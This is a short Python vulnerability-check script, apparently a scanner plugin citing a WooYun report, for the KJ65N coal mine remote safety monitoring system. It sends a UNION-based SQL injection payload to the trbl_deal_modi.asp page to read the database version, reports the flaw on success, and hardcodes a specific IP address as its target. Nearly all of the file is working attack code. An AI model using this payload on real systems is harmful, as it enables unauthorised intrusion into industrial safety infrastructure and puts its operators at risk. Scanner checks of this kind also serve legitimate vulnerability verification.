#!/usr/bin/env python
# -*- coding: utf-8 -*-
#ref::http://www.wooyun.org/bugs/wooyun-2010-0148855
import re
def assign(service, arg):
    if service == 'kj65n_monitor':
        return True, arg
        
def audit(arg):
    payload = 'yhpc/trbl_deal_modi.asp?pActFlag=MODIFY&pId=-7653%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL--'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code==200 and "Microsoft SQL Server" in res:
        security_hole('KJ65N煤矿远程监控安全预警系统SQL注入:%s'%target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('kj65n_monitor','http://211.141.82.13:8001/')[1])
